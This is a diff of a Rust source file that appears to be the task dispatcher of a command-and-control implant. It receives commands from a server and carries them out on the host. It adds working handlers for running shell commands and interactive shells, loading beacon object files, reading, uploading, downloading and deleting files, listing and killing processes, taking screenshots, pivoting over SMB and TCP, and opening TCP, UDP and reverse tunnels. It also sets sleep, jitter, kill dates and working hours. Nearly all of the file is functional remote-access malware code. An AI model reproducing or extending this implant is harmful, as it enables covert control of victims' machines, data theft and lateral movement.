@@ -6,45 +6,84 @@
 // Wire format (agent → server, Big-Endian):
 //   [BE u32 totalBlobSize][repeated: [BE u32 taskId][BE u32 cmdCode][BE fields…]]
 //
-// Command levels:
-//   L3 — fully implemented (portable std library)
-//   L2 — partially implemented (platform-specific)
-//   L1 — explicit unsupported response
+// Command coverage bands for this scaffold (not a claim of full implant parity):
+//   C3 — protocol-aligned runnable scaffold path
+//   C2 — thin platform-backed implementation suitable as a template starting point
+//   C1 — explicit boundary/TODO/unsupported surface left for the developer
 
 #![allow(dead_code)]
 
+use std::collections::HashMap;
 use std::env;
 use std::fs;
+use std::io::{self, ErrorKind};
+#[cfg(windows)]
 use std::path::Path;
 use std::process::Command;
-use std::time::{SystemTime, UNIX_EPOCH};
+use std::sync::{Mutex, OnceLock};
+use std::time::UNIX_EPOCH;
+#[cfg(windows)]
+use std::time::SystemTime;
 
-use crate::protocol::{self, ReaderLE, WriterBE};
 use crate::agent::Agent;
+use crate::protocol::{self, ReaderLE, WriterBE};
+use crate::runtime_common;
+use crate::runtime_fs;
+use crate::transport_scaffold;
 
-// ─── Task-level processor ──────────────────────────────────────────────────────
+const WIN_ERR_FILE_NOT_FOUND: u32 = 2;
+const WIN_ERR_ACCESS_DENIED: u32 = 5;
+const WIN_ERR_GEN_FAILURE: u32 = 31;
+const WIN_ERR_UNSUPPORTED: u32 = 50;
+const WIN_ERR_TIMED_OUT: u32 = 10060;
+const WIN_ERR_CONN_REFUSED: u32 = 10061;
+const WIN_ERR_HOST_UNREACH: u32 = 10065;
 
-/// Parse the decrypted task blob and return a response blob.
+struct MemoryChunkBuffer {
+    total_size: usize,
+    data: Vec<u8>,
+}
+
+struct DiskEntry {
+    letter: u8,
+    disk_type: u32,
+}
+
+struct ProcessEntry {
+    pid: u16,
+    ppid: u16,
+    session_id: u16,
+    is_arch64: bool,
+    elevated: bool,
+    domain: String,
+    username: String,
+    name: String,
+}
+
+fn memory_store() -> &'static Mutex<HashMap<u32, MemoryChunkBuffer>> {
+    static STORE: OnceLock<Mutex<HashMap<u32, MemoryChunkBuffer>>> = OnceLock::new();
+    STORE.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
 pub fn process_tasks(agent: &mut Agent, data: &[u8]) -> Option<Vec<u8>> {
     if data.len() < 4 {
         return None;
     }
+
     let mut r = ReaderLE::new(data);
     let _total_size = r.read_u32();
-
-    let mut inner: Vec<u8> = Vec::new();
+    let mut inner = Vec::new();
 
     while r.remaining() >= 4 {
         let cmd_code = r.read_u32();
-
         let (resp_data, task_id_parsed, resp_cmd_code) = dispatch_command(agent, &mut r, cmd_code);
 
-        // taskId follows each command's fields.
-        // If the handler consumed it, use that; otherwise read it now.
         let task_id = if task_id_parsed > 0 {
             task_id_parsed
         } else {
-            if r.remaining() < 4 { break; }
+            if r.remaining() < 4 {
+                break;
+            }
             r.read_u32()
         };
 
@@ -61,23 +100,550 @@ pub fn process_tasks(agent: &mut Agent, data: &[u8]) -> Option<Vec<u8>> {
         return None;
     }
 
-    // Wrap: [BE u32 totalBlobSize (includes this field)][inner]
-    let total = (inner.len() + 4) as u32;
     let mut out = WriterBE::new();
-    out.write_u32(total);
-    let mut out_bytes = out.into_bytes();
-    out_bytes.extend_from_slice(&inner);
-    Some(out_bytes)
+    out.write_u32((inner.len() + 4) as u32);
+    let mut blob = out.into_bytes();
+    blob.extend_from_slice(&inner);
+    Some(blob)
 }
 
-/// Single-command dispatch (called from agent.dispatch for API compatibility).
 pub fn dispatch(agent: &mut Agent, cmd_code: u32, _cmd_id: u32, data: &[u8]) -> Option<Vec<u8>> {
     let mut r = ReaderLE::new(data);
     let (resp, _, _) = dispatch_command(agent, &mut r, cmd_code);
     resp
 }
 
-// ─── Error response: [BE u32 errorCode] under COMMAND_ERROR ────────────────────
+fn dispatch_command(agent: &mut Agent, r: &mut ReaderLE, cmd_code: u32) -> (Option<Vec<u8>>, u32, u32) {
+    match cmd_code {
+        protocol::COMMAND_TERMINATE => {
+            let _ = r.read_u32();
+            std::process::exit(0);
+        }
+        protocol::COMMAND_EXIT => {
+            let _ = r.read_u32();
+            std::process::exit(0);
+        }
+
+        protocol::COMMAND_PWD => match env::current_dir() {
+            Ok(cwd) => {
+                let mut w = WriterBE::new();
+                w.write_string(&cwd.to_string_lossy());
+                (Some(w.into_bytes()), 0, 0)
+            }
+            Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+        },
+
+        protocol::COMMAND_CD => {
+            let path = r.read_string();
+            let norm = runtime_fs::normalize_path(&path);
+            match env::set_current_dir(&norm) {
+                Ok(_) => {
+                    let cwd = env::current_dir().map(|d| d.to_string_lossy().to_string()).unwrap_or_default();
+                    let mut w = WriterBE::new();
+                    w.write_string(&cwd);
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_CAT => {
+            let path = r.read_string();
+            match fs::read(runtime_fs::normalize_path(&path)) {
+                Ok(content) => {
+                    let mut w = WriterBE::new();
+                    w.write_string(&path);
+                    w.write_bytes(&content);
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_LS => {
+            let dir = r.read_string();
+            match list_directory(&dir) {
+                Ok((abs_path, entries)) => {
+                    let mut w = WriterBE::new();
+                    w.write_u8(1);
+                    w.write_string(&format!("{abs_path}\\*"));
+                    w.write_u32(entries.len() as u32);
+                    for entry in entries {
+                        w.write_u8(if entry.1 { 1 } else { 0 });
+                        w.write_u64(entry.2);
+                        w.write_u32(entry.3);
+                        w.write_string(&entry.0);
+                    }
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => {
+                    let mut w = WriterBE::new();
+                    w.write_u8(0);
+                    w.write_u32(win32_error_code(&err));
+                    (Some(w.into_bytes()), 0, 0)
+                }
+            }
+        }
+
+        protocol::COMMAND_MKDIR => {
+            let path = r.read_string();
+            match fs::create_dir_all(runtime_fs::normalize_path(&path)) {
+                Ok(_) => {
+                    let mut w = WriterBE::new();
+                    w.write_string(&path);
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_RM => {
+            let path = r.read_string();
+            match fs::remove_dir_all(runtime_fs::normalize_path(&path)).or_else(|_| fs::remove_file(runtime_fs::normalize_path(&path))) {
+                Ok(_) => (Some(Vec::new()), 0, 0),
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_MV => {
+            let src = r.read_string();
+            let dst = r.read_string();
+            match fs::rename(runtime_fs::normalize_path(&src), runtime_fs::normalize_path(&dst)) {
+                Ok(_) => (Some(Vec::new()), 0, 0),
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_COPY => {
+            let src = r.read_string();
+            let dst = r.read_string();
+            match runtime_fs::copy_recursive(&runtime_fs::normalize_path(&src), &runtime_fs::normalize_path(&dst)) {
+                Ok(_) => (Some(Vec::new()), 0, 0),
+                Err(_) => (Some(command_error_response(WIN_ERR_GEN_FAILURE)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_DISKS => match list_disks() {
+            Ok(disks) => {
+                let mut w = WriterBE::new();
+                w.write_u8(1);
+                w.write_u32(disks.len() as u32);
+                for disk in disks {
+                    w.write_u8(disk.letter);
+                    w.write_u32(disk.disk_type);
+                }
+                (Some(w.into_bytes()), 0, 0)
+            }
+            Err(err) => {
+                let mut w = WriterBE::new();
+                w.write_u8(0);
+                w.write_u32(win32_error_code(&err));
+                (Some(w.into_bytes()), 0, 0)
+            }
+        },
+
+        protocol::COMMAND_DOWNLOAD => {
+            let path = r.read_string();
+            let task_id = r.read_u32();
+            match fs::read(runtime_fs::normalize_path(&path)) {
+                Ok(data) => {
+                    queue_download_sequence(task_id, task_id, &path, &data);
+                    (None, task_id, 0)
+                }
+                Err(err) => (Some(system_error_response(&err)), task_id, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_PS_LIST => match list_processes() {
+            Ok(processes) => {
+                let mut w = WriterBE::new();
+                w.write_u8(1);
+                w.write_u32(processes.len() as u32);
+                for proc in processes {
+                    w.write_u16(proc.pid);
+                    w.write_u16(proc.ppid);
+                    w.write_u16(proc.session_id);
+                    w.write_u8(if proc.is_arch64 { 1 } else { 0 });
+                    w.write_u8(if proc.elevated { 1 } else { 0 });
+                    w.write_string(&proc.domain);
+                    w.write_string(&proc.username);
+                    w.write_string(&proc.name);
+                }
+                (Some(w.into_bytes()), 0, 0)
+            }
+            Err(err) => {
+                let mut w = WriterBE::new();
+                w.write_u8(0);
+                w.write_u32(win32_error_code(&err));
+                (Some(w.into_bytes()), 0, 0)
+            }
+        },
+
+        protocol::COMMAND_PS_KILL | protocol::COMMAND_KILL => {
+            let pid = r.read_u32();
+            kill_process(pid)
+        }
+
+        protocol::COMMAND_GETUID => {
+            let username = env::var("USER").or_else(|_| env::var("USERNAME")).unwrap_or_default();
+            let domain = env::var("USERDOMAIN").unwrap_or_default();
+            let mut w = WriterBE::new();
+            w.write_u8(if runtime_common::is_elevated() { 1 } else { 0 });
+            w.write_string(&domain);
+            w.write_string(&username);
+            (Some(w.into_bytes()), 0, 0)
+        }
+
+        protocol::COMMAND_PROFILE => {
+            let subcmd = r.read_u32();
+            (Some(handle_profile(agent, r, subcmd)), 0, 0)
+        }
+
+        protocol::COMMAND_JOB_LIST => {
+            let mut entries = agent.jobs.list();
+            entries.extend(transport_scaffold::shell_job_entries());
+            let mut w = WriterBE::new();
+            w.write_u32(entries.len() as u32);
+            for (job_id, job_type, _) in entries {
+                w.write_u32(job_id);
+                w.write_u16(job_type as u16);
+                w.write_u16(0);
+            }
+            (Some(w.into_bytes()), 0, 0)
+        }
+
+        protocol::COMMAND_JOBS_KILL => {
+            let job_id = r.read_u32();
+            let result = transport_scaffold::kill_shell_job(job_id) || agent.jobs.kill(job_id);
+            let mut w = WriterBE::new();
+            w.write_u8(if result { 1 } else { 0 });
+            w.write_u32(job_id);
+            (Some(w.into_bytes()), 0, 0)
+        }
+
+        protocol::COMMAND_EXEC_BOF => {
+            let async_exec = r.read_u8() != 0;
+            let _entry = r.read_string();
+            let bof = r.read_bytes();
+            let args = r.read_bytes();
+            let result = if async_exec { crate::bof::load_async(&bof, &args) } else { crate::bof::load(&bof, &args) };
+            match result {
+                Ok(ctx) => {
+                    let msg = ctx.msgs.into_iter().next().unwrap_or(crate::bof::BofMsg {
+                        msg_type: protocol::CALLBACK_OUTPUT_UTF8,
+                        data: b"BOF completed".to_vec(),
+                    });
+                    (Some(command_output_message(msg.msg_type as u32, &msg.data)), 0, protocol::COMMAND_EXEC_BOF_OUT)
+                }
+                Err(err) => (Some(command_error_string(protocol::CALLBACK_ERROR, &err)), 0, protocol::COMMAND_EXEC_BOF_OUT),
+            }
+        }
+
+        protocol::COMMAND_SAVEMEMORY => {
+            let memory_id = r.read_u32();
+            let total_size = r.read_u32() as usize;
+            let chunk = r.read_bytes();
+            if let Ok(mut store) = memory_store().lock() {
+                let entry = store.entry(memory_id).or_insert_with(|| MemoryChunkBuffer { total_size, data: Vec::new() });
+                if entry.total_size == 0 {
+                    entry.total_size = total_size;
+                }
+                entry.data.extend_from_slice(&chunk);
+            }
+            (None, 0, 0)
+        }
+
+        protocol::COMMAND_UPLOAD => {
+            let memory_id = r.read_u32();
+            let remote_path = r.read_string();
+            let norm = runtime_fs::normalize_path(&remote_path);
+            let entry = memory_store().lock().ok().and_then(|mut store| store.remove(&memory_id));
+            let Some(mut entry) = entry else {
+                return (Some(command_error_response(WIN_ERR_FILE_NOT_FOUND)), 0, protocol::COMMAND_ERROR);
+            };
+            if entry.total_size > 0 && entry.data.len() > entry.total_size {
+                entry.data.truncate(entry.total_size);
+            }
+            match fs::write(norm, &entry.data) {
+                Ok(_) => (Some(Vec::new()), 0, 0),
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_EXFIL => {
+            let state = r.read_u32();
+            let file_id = r.read_u32();
+            let mut w = WriterBE::new();
+            w.write_u32(file_id);
+            w.write_u8(state as u8);
+            (Some(w.into_bytes()), 0, protocol::COMMAND_EXFIL)
+        }
+
+        protocol::COMMAND_RUN => {
+            let prog = r.read_string();
+            let args = r.read_string();
+            let task_id = r.read_u32();
+            match start_detached_process(&prog, &args) {
+                Ok(pid) => {
+                    let mut w = WriterBE::new();
+                    w.write_u32(pid);
+                    w.write_u8(0);
+                    w.write_string(&prog);
+                    (Some(w.into_bytes()), task_id, 0)
+                }
+                Err(err) => (Some(command_error_string(protocol::CALLBACK_ERROR, &err)), task_id, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_PS_RUN => {
+            let output_requested = r.read_u8() != 0;
+            let impersonation = r.read_u8() != 0;
+            let _ = r.read_u32();
+            let command_line = r.read_string();
+            if output_requested || impersonation {
+                return (Some(unsupported_response()), 0, protocol::COMMAND_ERROR);
+            }
+            match start_detached_command_line(&command_line) {
+                Ok(pid) => {
+                    let mut w = WriterBE::new();
+                    w.write_u32(pid);
+                    w.write_u8(0);
+                    w.write_string(&command_line);
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => (Some(command_error_string(protocol::CALLBACK_ERROR, &err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_REV2SELF => (Some(Vec::new()), 0, 0),
+
+        protocol::COMMAND_SHELL => {
+            let cmd_line = r.read_string();
+            match run_shell_command(&cmd_line) {
+                Ok(output) => {
+                    let mut w = WriterBE::new();
+                    w.write_string(&output);
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_SHELL_START => {
+            let shell_id = r.read_u32();
+            let program_args = r.read_string();
+            match transport_scaffold::start_shell_session(shell_id, &program_args) {
+                Ok(_) => {
+                    let mut w = WriterBE::new();
+                    w.write_u8(protocol::JOB_TYPE_SHELL as u8);
+                    w.write_u8(protocol::JOB_STATE_STARTING as u8);
+                    (Some(w.into_bytes()), shell_id, protocol::COMMAND_JOB)
+                }
+                Err(err) => {
+                    let mut w = WriterBE::new();
+                    w.write_u8(protocol::JOB_TYPE_SHELL as u8);
+                    w.write_u8(protocol::JOB_STATE_FINISHED as u8);
+                    w.write_u32(win32_like_net_error(&err));
+                    (Some(w.into_bytes()), shell_id, protocol::COMMAND_JOB)
+                }
+            }
+        }
+
+        protocol::COMMAND_SHELL_WRITE => {
+            let shell_id = r.read_u32();
+            let payload = r.read_bytes();
+            match transport_scaffold::write_shell_input(shell_id, &payload) {
+                Ok(_) => (None, shell_id, 0),
+                Err(err) => (Some(command_error_response(win32_like_net_error(&err))), shell_id, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_SHELL_CLOSE => {
+            let shell_id = r.read_u32();
+            let _ = transport_scaffold::close_shell_session(shell_id);
+            (None, shell_id, 0)
+        }
+
+        protocol::COMMAND_SCREENSHOT => match capture_screenshot_png() {
+            Ok(img) => {
+                let mut w = WriterBE::new();
+                w.write_bytes(&img);
+                (Some(w.into_bytes()), 0, 0)
+            }
+            Err(err) => (Some(command_error_string(protocol::CALLBACK_ERROR, &err)), 0, protocol::COMMAND_ERROR),
+        },
+
+        protocol::COMMAND_ZIP => {
+            let src = r.read_string();
+            let dst = r.read_string();
+            match zip_to_file(&src, &dst) {
+                Ok(()) => {
+                    let mut w = WriterBE::new();
+                    w.write_string(&dst);
+                    (Some(w.into_bytes()), 0, 0)
+                }
+                Err(err) => (Some(command_error_string(protocol::CALLBACK_ERROR, &err)), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_LINK => {
+            let pivot_type = r.read_u32() as u8;
+            match pivot_type {
+                transport_scaffold::PIVOT_TYPE_SMB => {
+                    let pipe_name = r.read_string();
+                    let task_id = r.read_u32();
+                    match transport_scaffold::start_pivot_smb(task_id, &pipe_name) {
+                        Ok(payload) => (Some(payload), task_id, protocol::COMMAND_LINK),
+                        Err(err) => (Some(command_error_response(win32_error_code(&err))), task_id, protocol::COMMAND_ERROR),
+                    }
+                }
+                transport_scaffold::PIVOT_TYPE_TCP => {
+                    let address = r.read_string();
+                    let port = r.read_u32() as u16;
+                    let task_id = r.read_u32();
+                    match transport_scaffold::start_pivot_tcp(task_id, &address, port) {
+                        Ok(payload) => (Some(payload), task_id, protocol::COMMAND_LINK),
+                        Err(err) => (Some(command_error_response(win32_like_net_error(&err))), task_id, protocol::COMMAND_ERROR),
+                    }
+                }
+                _ => (Some(unsupported_response()), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_UNLINK => {
+            let pivot_id = r.read_u32();
+            let task_id = r.read_u32();
+            let pivot_type = transport_scaffold::close_pivot_session(pivot_id);
+            let mut w = WriterBE::new();
+            w.write_u32(pivot_id);
+            w.write_u8(pivot_type);
+            (Some(w.into_bytes()), task_id, protocol::COMMAND_UNLINK)
+        }
+
+        protocol::COMMAND_PIVOT_EXEC => {
+            let pivot_id = r.read_u32();
+            let payload = r.read_bytes();
+            match transport_scaffold::write_pivot_data(pivot_id, &payload) {
+                Ok(_) => (None, 0, 0),
+                Err(err) => (Some(command_error_response(win32_like_net_error(&err))), 0, protocol::COMMAND_ERROR),
+            }
+        }
+
+        protocol::COMMAND_TUNNEL_START_TCP => {
+            let channel_id = r.read_u32();
+            let tunnel_type = r.read_u32();
+            let address = r.read_string();
+            let port = r.read_u32() as u16;
+            let task_id = r.read_u32();
+            match transport_scaffold::start_tcp_tunnel(channel_id, tunnel_type, &address, port) {
+                Ok(payload) => (Some(payload), task_id, protocol::COMMAND_TUNNEL_START_TCP),
+                Err(err) => (Some(tunnel_status_payload(tunnel_type, win32_like_net_error(&err))), task_id, protocol::COMMAND_TUNNEL_START_TCP),
+            }
+        }
+
+        protocol::COMMAND_TUNNEL_START_UDP => {
+            let channel_id = r.read_u32();
+            let address = r.read_string();
+            let port = r.read_u32() as u16;
+            let task_id = r.read_u32();
+            match transport_scaffold::start_udp_tunnel(channel_id, &address, port) {
+                Ok(payload) => (Some(payload), task_id, protocol::COMMAND_TUNNEL_START_TCP),
+                Err(err) => (Some(tunnel_status_payload(2, win32_like_net_error(&err))), task_id, protocol::COMMAND_TUNNEL_START_TCP),
+            }
+        }
+
+        protocol::COMMAND_TUNNEL_WRITE_TCP | protocol::COMMAND_TUNNEL_WRITE_UDP => {
+            let channel_id = r.read_u32();
+            let payload = r.read_bytes();
+            match transport_scaffold::write_tunnel_data(channel_id, &payload) {
+                Ok(_) => (None, channel_id, 0),
+                Err(err) => {
+                    transport_scaffold::note_tunnel_write_failure(channel_id, win32_like_net_error(&err));
+                    (None, channel_id, 0)
+                }
+            }
+        }
+
+        protocol::COMMAND_TUNNEL_CLOSE => {
+            let channel_id = r.read_u32();
+            let _ = transport_scaffold::close_tunnel_session(channel_id);
+            (None, channel_id, 0)
+        }
+
+        protocol::COMMAND_TUNNEL_REVERSE => {
+            let tunnel_id = r.read_u32();
+            let port = r.read_u32() as u16;
+            let task_id = r.read_u32();
+            (Some(transport_scaffold::start_reverse_tunnel(tunnel_id, port)), task_id, protocol::COMMAND_TUNNEL_REVERSE)
+        }
+
+        protocol::COMMAND_TUNNEL_ACCEPT => {
+            let _ = r.read_u32();
+            (None, 0, 0)
+        }
+
+        protocol::COMMAND_TUNNEL_PAUSE => {
+            let channel_id = r.read_u32();
+            transport_scaffold::set_tunnel_paused(channel_id, true);
+            (None, channel_id, 0)
+        }
+
+        protocol::COMMAND_TUNNEL_RESUME => {
+            let channel_id = r.read_u32();
+            transport_scaffold::set_tunnel_paused(channel_id, false);
+            (None, channel_id, 0)
+        }
+
+        _ => (Some(unsupported_response()), 0, protocol::COMMAND_ERROR),
+    }
+}
+
+fn handle_profile(agent: &mut Agent, r: &mut ReaderLE, subcmd: u32) -> Vec<u8> {
+    let mut w = WriterBE::new();
+    w.write_u32(subcmd);
+
+    match subcmd {
+        1 => {
+            let sleep = r.read_u32();
+            let jitter = r.read_u32();
+            agent.sleep_ms = (sleep as u64) * 1000;
+            agent.jitter = jitter;
+            w.write_u32(sleep);
+            w.write_u32(jitter);
+        }
+        2 => {
+            let size = r.read_u32();
+            w.write_u32(size);
+        }
+        3 => {
+            let kd = r.read_u32();
+            agent.kill_date = kd as i64;
+            w.write_u32(kd);
+        }
+        4 => {
+            let wt = r.read_u32();
+            let (work_start, work_end) = runtime_common::decode_working_time(wt);
+            agent.work_start = work_start;
+            agent.work_end = work_end;
+            w.write_u32(wt);
+        }
+        5 => {
+            let enabled = r.read_u32();
+            let burst_sleep = r.read_u32();
+            let burst_jit = r.read_u32();
+            w.write_u32(enabled);
+            w.write_u32(burst_sleep);
+            w.write_u32(burst_jit);
+        }
+        6 => {
+            w.write_u32(0);
+            w.write_u32(50);
+            w.write_u32(0);
+        }
+        _ => {}
+    }
+    w.into_bytes()
+}
 
 fn command_error_response(code: u32) -> Vec<u8> {
     let mut w = WriterBE::new();
@@ -86,484 +652,11 @@ fn command_error_response(code: u32) -> Vec<u8> {
 }
 
 fn unsupported_response() -> Vec<u8> {
-    command_error_response(50)
+    command_error_response(WIN_ERR_UNSUPPORTED)
 }
 
-fn system_error_response(err: &std::io::Error) -> Vec<u8> {
-    use std::io::ErrorKind;
-
-    let code = match err.kind() {
-        ErrorKind::NotFound => 2,
-        ErrorKind::PermissionDenied => 5,
-        _ => 31,
-    };
-    command_error_response(code)
-}
-
-fn decode_working_time(value: u32) -> (i32, i32) {
-    if value == 0 {
-        return (0, 0);
-    }
-    let start_hour = ((value >> 24) & 0xff) as i32;
-    let start_min = ((value >> 16) & 0xff) as i32;
-    let end_hour = ((value >> 8) & 0xff) as i32;
-    let end_min = (value & 0xff) as i32;
-    (start_hour * 100 + start_min, end_hour * 100 + end_min)
-}
-
-// ─── Normalize path ────────────────────────────────────────────────────────────
-
-fn normalize_path(p: &str) -> String {
-    if p.is_empty() || p == "." {
-        return env::current_dir()
-            .map(|d| d.to_string_lossy().to_string())
-            .unwrap_or_else(|_| ".".to_string());
-    }
-    p.to_string()
-}
-
-// ─── Recursive copy ────────────────────────────────────────────────────────────
-
-fn copy_recursive(src: &Path, dst: &Path) -> Result<(), String> {
-    if src.is_dir() {
-        fs::create_dir_all(dst).map_err(|e| e.to_string())?;
-        for entry in fs::read_dir(src).map_err(|e| e.to_string())? {
-            let entry = entry.map_err(|e| e.to_string())?;
-            let child_dst = dst.join(entry.file_name());
-            copy_recursive(&entry.path(), &child_dst)?;
-        }
-        Ok(())
-    } else {
-        fs::copy(src, dst).map_err(|e| e.to_string())?;
-        Ok(())
-    }
-}
-
-// ─── Profile sub-command handler ───────────────────────────────────────────────
-
-fn handle_profile(agent: &mut Agent, r: &mut ReaderLE, subcmd: u32) -> Vec<u8> {
-    let mut w = WriterBE::new();
-    w.write_u32(subcmd);
-
-    match subcmd {
-        1 => { // sleep + jitter
-            let sleep  = r.read_u32();
-            let jitter = r.read_u32();
-            agent.sleep_ms = (sleep as u64) * 1000;
-            agent.jitter   = jitter;
-            w.write_u32(sleep);
-            w.write_u32(jitter);
-        }
-        2 => { // download chunk size
-            let size = r.read_u32();
-            w.write_u32(size);
-        }
-        3 => { // killdate
-            let kd = r.read_u32();
-            agent.kill_date = kd as i64;
-            w.write_u32(kd);
-        }
-        4 => { // workingtime
-            let wt = r.read_u32();
-            let (work_start, work_end) = decode_working_time(wt);
-            agent.work_start = work_start;
-            agent.work_end = work_end;
-            w.write_u32(wt);
-        }
-        5 => { // burst set
-            let enabled     = r.read_u32();
-            let burst_sleep = r.read_u32();
-            let burst_jit   = r.read_u32();
-            w.write_u32(enabled);
-            w.write_u32(burst_sleep);
-            w.write_u32(burst_jit);
-        }
-        6 => { // burst show
-            w.write_u32(0);  // enabled
-            w.write_u32(50); // sleep ms
-            w.write_u32(0);  // jitter
-        }
-        _ => {}
-    }
-    w.into_bytes()
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// Command dispatcher
-// Returns (Option<response_bytes>, consumed_task_id, response_cmd_code).
-// consumed_task_id > 0 if the handler read taskId from the stream.
-// ═══════════════════════════════════════════════════════════════════════════════
-
-fn dispatch_command(agent: &mut Agent, r: &mut ReaderLE, cmd_code: u32) -> (Option<Vec<u8>>, u32, u32) {
-    match cmd_code {
-
-    // ── L3: Exit / Terminate ───────────────────────────────────────────────
-
-    protocol::COMMAND_TERMINATE => {
-        let _subcode = r.read_u32();
-        std::process::exit(0);
-    }
-    protocol::COMMAND_EXIT => {
-        let _exit_method = r.read_u32();
-        std::process::exit(0);
-    }
-
-    // ── L3: PWD ────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_PWD => {
-        match env::current_dir() {
-            Ok(cwd) => {
-                let mut w = WriterBE::new();
-                w.write_string(&cwd.to_string_lossy());
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(e) => (Some(system_error_response(&e)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: CD ─────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_CD => {
-        let path = r.read_string();
-        let norm = normalize_path(&path);
-        match env::set_current_dir(&norm) {
-            Ok(_) => {
-                let cwd = env::current_dir()
-                    .map(|d| d.to_string_lossy().to_string())
-                    .unwrap_or_default();
-                let mut w = WriterBE::new();
-                w.write_string(&cwd);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(e) => (Some(system_error_response(&e)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: CAT ────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_CAT => {
-        let path = r.read_string();
-        let norm = normalize_path(&path);
-        match fs::read(&norm) {
-            Ok(content) => {
-                let mut w = WriterBE::new();
-                w.write_string(&path);
-                w.write_bytes(&content);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(e) => (Some(system_error_response(&e)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: MKDIR ──────────────────────────────────────────────────────────
-
-    protocol::COMMAND_MKDIR => {
-        let path = r.read_string();
-        let norm = normalize_path(&path);
-        match fs::create_dir_all(&norm) {
-            Ok(_) => {
-                let mut w = WriterBE::new();
-                w.write_string(&path);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(e) => (Some(system_error_response(&e)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: RM ─────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_RM => {
-        let path = r.read_string();
-        let norm = normalize_path(&path);
-        let result = if Path::new(&norm).is_dir() {
-            fs::remove_dir_all(&norm)
-        } else {
-            fs::remove_file(&norm)
-        };
-        match result {
-            Ok(_)  => (Some(Vec::new()), 0, 0),
-            Err(e) => (Some(system_error_response(&e)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: MV ─────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_MV => {
-        let src = r.read_string();
-        let dst = r.read_string();
-        match fs::rename(normalize_path(&src), normalize_path(&dst)) {
-            Ok(_)  => (Some(Vec::new()), 0, 0),
-            Err(e) => (Some(system_error_response(&e)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: COPY ───────────────────────────────────────────────────────────
-
-    protocol::COMMAND_COPY => {
-        let src = r.read_string();
-        let dst = r.read_string();
-        let src_p = Path::new(&normalize_path(&src)).to_path_buf();
-        let dst_p = Path::new(&normalize_path(&dst)).to_path_buf();
-        match copy_recursive(&src_p, &dst_p) {
-            Ok(_)  => (Some(Vec::new()), 0, 0),
-            Err(e) => (Some(command_error_response(31)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L3: PS_KILL ────────────────────────────────────────────────────────
-
-    protocol::COMMAND_PS_KILL => {
-        let pid = r.read_u32();
-        #[cfg(unix)]
-        {
-            use std::process::Command as Cmd;
-            match Cmd::new("kill").arg("-9").arg(pid.to_string()).output() {
-                Ok(_)  => (Some(Vec::new()), 0, 0),
-                Err(e) => (Some(command_error_response(31)), 0, protocol::COMMAND_ERROR),
-            }
-        }
-        #[cfg(not(unix))]
-        {
-            (Some(unsupported_response()), 0, protocol::COMMAND_ERROR)
-        }
-    }
-
-    // ── L3: KILL ───────────────────────────────────────────────────────────
-
-    protocol::COMMAND_KILL => {
-        let pid = r.read_u32();
-        #[cfg(unix)]
-        {
-            use std::process::Command as Cmd;
-            match Cmd::new("kill").arg("-9").arg(pid.to_string()).output() {
-                Ok(_)  => (Some(Vec::new()), 0, 0),
-                Err(e) => (Some(command_error_response(31)), 0, protocol::COMMAND_ERROR),
-            }
-        }
-        #[cfg(not(unix))]
-        {
-            (Some(unsupported_response()), 0, protocol::COMMAND_ERROR)
-        }
-    }
-
-    // ── L3: PROFILE ────────────────────────────────────────────────────────
-
-    protocol::COMMAND_PROFILE => {
-        let subcmd = r.read_u32();
-        let resp = handle_profile(agent, r, subcmd);
-        (Some(resp), 0, 0)
-    }
-
-    // ── L2: LS ─────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_LS => {
-        let dir_str = r.read_string();
-        let dir = normalize_path(&dir_str);
-
-        match fs::read_dir(&dir) {
-            Err(_) => {
-                let mut w = WriterBE::new();
-                w.write_u8(0); // result = error
-                w.write_u32(1);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Ok(entries) => {
-                let mut w = WriterBE::new();
